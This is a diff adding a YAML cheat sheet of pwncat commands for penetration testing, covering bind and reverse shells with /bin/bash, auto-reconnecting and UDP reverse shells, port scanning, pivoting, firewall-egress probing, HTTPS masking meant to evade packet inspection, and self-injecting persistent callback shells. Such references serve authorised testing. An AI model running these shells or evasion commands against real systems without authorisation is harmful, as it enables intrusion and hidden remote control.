@@ -1,0 +1,110 @@
+tool: pwncat
+tags: [network, connectivity, scanning, pentest, reverse-shell, pivoting, firewall-evasion]
+
+actions:
+# === BASIC MODES (LISTEN & CONNECT) ===
+ - title: pwncat - basic tcp listener
+   desc: |
+     Starts a standard TCP listener on a specified port. This is the primary way 
+     to wait for incoming connections from a remote host. By default, the 
+     server will terminate once the client disconnects or the session ends.
+   command: "pwncat -l {{port|4444}}"
+
+ - title: pwncat - basic tcp client connection
+   desc: |
+     Initiates a TCP connection to a remote host and port. This is used to connect 
+     to a listening service or a bind shell on a target machine. It acts as a 
+     standard network client similar to netcat.
+   command: "pwncat {{hostname}} {{port|4444}}"
+
+ - title: pwncat - bind shell listener
+   desc: |
+     Starts a listener and executes a shell command when a client connects. 
+     This effectively creates a bind shell on the machine where this command is run. 
+     Use this with caution as it provides remote access to the system's command line.
+   command: "pwncat -l {{port|4444}} -e {{shell|/bin/bash}}"
+
+# === PERSISTENCE & RELIABILITY ===
+ - title: pwncat - persistent listener (keep-open)
+   desc: |
+     Starts a TCP listener that stays open and accepts new connections even 
+     after a client disconnects. The -k or --keep-open flag prevents the 
+     process from exiting when the first session is closed. This is essential 
+     for maintaining a steady entry point during a penetration test.
+   command: "pwncat -l -k {{port|4444}}"
+
+ - title: pwncat - automatic client reconnection
+   desc: |
+     Attempts to connect to a remote host and automatically retries if the 
+     connection is refused or dropped. The --reconn flag can be followed by 
+     a number for specific retries or left empty for infinite attempts. 
+     This ensures a reverse shell remains active through network instability.
+   command: "pwncat {{hostname}} {{port|4444}} --reconn --reconn-wait {{seconds|5}}"
+
+ - title: pwncat - listener with rebind on failure
+   desc: |
+     Instructs the server to attempt to re-bind to the port if the initial 
+     attempt fails. This is useful in scenarios where a port might be 
+     temporarily locked by the OS or another process. You can specify 
+     how many times to retry before the tool gives up.
+   command: "pwncat -l {{port|4444}} --rebind {{retry_count|10}} --rebind-wait {{seconds|2}}"
+
+# === PORT SCANNING (ZERO-I/O) ===
+ - title: pwncat - port scanning with banner grabbing
+   desc: |
+     Scans a range of ports on a target host using Zero-I/O mode. The --banner 
+     flag attempts to capture the service banner for version detection. 
+     You can specify port ranges using hyphens or lists using commas 
+     to quickly identify open services.
+   command: "pwncat -z {{hostname}} {{port_range|1-1024}} --banner"
+
+# === PORT FORWARDING & PIVOTING ===
+ - title: pwncat - local port forwarding
+   desc: |
+     Maps a local port to a remote service through an internal pwncat proxy. 
+     This allows you to access services on a remote network that are 
+     otherwise blocked by firewalls. Traffic sent to the local port 
+     is tunneled directly to the specified destination.
+   command: "pwncat -L {{local_addr|127.0.0.1}}:{{local_port|8080}} {{remote_host}} {{remote_port|80}}"
+
+ - title: pwncat - remote port forwarding
+   desc: |
+     Establishes two internal clients to proxy traffic between a target and 
+     a remote pwncat server. This mode is ideal for bypassing strict 
+     inbound firewall rules by initiating an outbound connection. It 
+     effectively pushes access to an internal service out to your listener.
+   command: "pwncat -R {{remote_listener_ip}}:{{remote_listener_port}} {{target_host}} {{target_port}}"
+
+# === EVASION & ADVANCED PROTOCOLS ===
+ - title: pwncat - traffic masking with http/https
+   desc: |
+     Wraps the communication in HTTP or HTTPS packets to evade Deep Packet 
+     Inspection (DPI) and firewall filters. This makes the connection 
+     appear as legitimate web traffic to security monitoring tools. 
+     Custom headers can be added to further mimic real browser requests.
+   command: "pwncat --{{protocol|https}} --header \"User-Agent: Mozilla/5.0\" {{hostname}} {{port|443}}"
+
+ - title: pwncat - udp reverse shell with ping init
+   desc: |
+     Creates a reverse shell over the UDP protocol, which is stateless. 
+     The --ping-init flag is required so the listener can discover the 
+     client's IP address and start communicating. This is useful for 
+     environments where TCP traffic is heavily monitored or restricted.
+   command: "pwncat {{hostname}} {{port|4444}} -u --ping-init --ping-intvl {{seconds|10}} -e {{shell|/bin/bash}}"
+
+ - title: pwncat - outbound port probing (port robin)
+   desc: |
+     Attempts to connect to a list of ports in a round-robin fashion to 
+     identify which outbound ports are permitted by a firewall. This 
+     is combined with the --reconn-robin flag to cycle through 
+     different destination ports until a connection is successful.
+   command: "pwncat {{hostname}} {{port|4444}} --reconn --reconn-robin {{port_list|80,443,53,8080}}"
+
+ - title: pwncat - automatic self-injection (experimental)
+   desc: |
+     Automatically deploys a persistent pwncat reverse shell once a 
+     connection is received. This replaces a simple shell (like bash) 
+     with a fully featured pwncat instance that connects back to 
+     your specified address. This is currently an experimental feature 
+     limited to Linux remote hosts.
+   command: "pwncat -l {{port|4444}} --self-inject {{shell|/bin/bash}}:{{callback_ip}}:{{callback_port|4445}}"
